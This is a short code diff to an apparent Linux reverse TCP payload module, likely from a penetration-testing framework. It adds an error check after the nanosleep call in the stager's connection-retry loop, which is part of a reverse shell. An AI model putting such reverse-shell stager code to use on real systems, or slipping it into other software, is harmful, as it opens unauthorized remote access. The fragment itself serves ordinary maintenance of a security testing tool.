@@ -135,6 +135,8 @@ module Payload::Linux::ReverseTcp
         mov ebx, esp
         xor ecx, ecx
         int 0x80                   ; sys_nanosleep
+        test eax, eax
+        js failed
         dec esi
         jnz create_socket
         jmp failed
